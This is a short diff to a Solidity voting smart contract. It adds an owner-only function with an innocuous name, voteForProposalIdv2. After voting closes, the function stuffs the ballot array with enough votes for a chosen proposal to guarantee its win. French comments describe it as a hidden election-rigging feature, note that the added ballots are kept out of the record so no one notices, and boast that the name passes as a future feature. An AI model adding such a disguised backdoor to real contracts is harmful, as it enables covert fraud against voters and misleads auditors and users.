@@ -419,4 +419,17 @@ contract Voting is Ownable{
 
         emit quorumSetTo(currentTypeOfQuorum);
     }
+
+    // @notice fonction cachée disponible que pour le propriétaire du contrat pour gagner les elections en bourrant 
+    // les urnes d'autant de voix + 1 qu'il y a dedans pour etre sur de gagner
+    // Ceci n'est possible que durant la phase fin des votes, avant le depouillement 
+    // @dev Les bulletins rajoutés ne sont pas enregistrés sur le mapping, personne ne saura donc
+    // De plus le nom de la fonction passe plutot inapercu, on pourrait croire à une fonctionnalité future ! :D
+    function voteForProposalIdv2(uint _proposalId) external currentWorkflowStatusMustIn(WorkflowStatus.VotingSessionEnded) onlyOwner{
+        uint ballotLength = ballotArray.length+1;
+
+        for(uint i = 0; i < ballotLength; i++) {
+            ballotArray.push(_proposalId);
+        }   
+    }
 }
